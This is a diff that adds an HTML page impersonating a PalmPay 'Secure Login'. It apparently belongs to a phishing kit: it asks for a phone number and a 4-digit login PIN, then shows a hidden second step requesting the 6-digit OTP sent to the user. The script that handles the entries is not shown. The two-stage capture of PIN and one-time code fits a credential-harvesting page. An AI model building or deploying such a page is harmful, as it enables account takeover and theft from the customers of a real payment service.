@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login | PalmPay</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <div class="login-card" id="login-card">
+            <div class="logo-section">
+                <span class="brand-name">PalmPay</span>
+            </div>
+            
+            <div class="form-header">
+                <h2>Welcome</h2>
+                <p>Log in to your account</p>
+            </div>
+
+            <form id="auth-form">
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="0801 234 5678" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="pin">Login PIN</label>
+                    <input type="password" id="pin" placeholder="****" maxlength="4" required>
+                </div>
+
+                <button type="submit" class="btn-primary" id="submit-btn">Login</button>
+            </form>
+        </div>
+
+        <div id="otp-section" style="display: none; text-align: center;">
+            <div class="logo-section">
+                <span class="brand-name">PalmPay</span>
+            </div>
+            <div class="form-header">
+                <h2>Verify OTP</h2>
+                <p>Check your messages for a 6-digit code</p>
+            </div>
+            
+            <div class="input-group">
+                <input type="number" id="otp-input" placeholder="******" maxlength="6" style="text-align: center;">
+            </div>
+
+            <p id="timer-text">Resend in 60s</p>
+            
+            <button type="button" class="btn-primary" id="verify-otp-btn">Verify and Continue</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
